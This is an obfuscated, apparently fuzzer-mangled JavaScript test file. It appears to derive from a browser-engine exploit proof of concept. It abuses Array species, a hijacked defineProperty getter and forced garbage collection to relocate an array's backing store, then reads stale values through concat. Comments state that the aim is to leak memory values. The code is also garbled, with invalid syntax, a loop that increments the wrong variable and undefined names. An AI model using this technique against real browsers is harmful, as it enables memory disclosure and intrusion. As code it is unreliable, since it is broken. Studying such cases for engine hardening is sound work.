var o360.prototype.o784 = function () {try {
"use strict";
}catch(e){}
  try {
switch (this.o412) {
    case 0:
      try {
if (this.o502 == 143) {
        try {
this.o781(0);
}catch(e){}
        try {
return this.o413 + 5016;
}catch(e){}
      }
}catch(e){}
      try {
this.o781(this.o502 + 1);
}catch(e){}
      try {
return this.o413 + 456;
}catch(e){}
    case 2:
    case 3:
      try {
this.o781(this.o502);
}catch(e){}
      try {
return this.o413;
}catch(e){}
    case 1:
      try {
this.o781(0);
}catch(e){}
      try {
return this.o413 + (456 * (154 - this.o502));
}catch(e){}
  }
}catch(e){}
} = o23.o26;
var e = o843 + (o844 >> 3);

class o2 extends Array {
    static get [Array.prototype.indexOf.species]() {
        try {
return function() { try {
return o0;
}catch(e){} }
}catch(e){}
    }; // custom constructor which returns a proxy object
}

var o3 = o73.o11;
try {
o3[1] = 0.1;
}catch(e){}
try {
o6 = 0.1;
}catch(e){}

function o4() {
    try {
for (var o5 = 0; o5 < 0x100000; ++o4) {
        var o232 = o231.charCodeAt(o82);
    }
}catch(e){}
}

function o7() {
    try {
o3.length = e;
}catch(e){} // shorten the array so the backstore pointer is relocated
    try {
o4();
}catch(e){}         // force gc to move the array's elements backstore
    try {
return o1;
}catch(e){}
}

try {
Object.prototype.__defineGetter__("defineProperty", o7);
}catch(e){}

var o8 = Array.prototype.concat.call(o3);

try {
for (var o5 = 0; o5 < 20; o5++) { // however many values you want to leak
    try {
o9.o10(o8[o5]);
}catch(e){}
}
}catch(e){}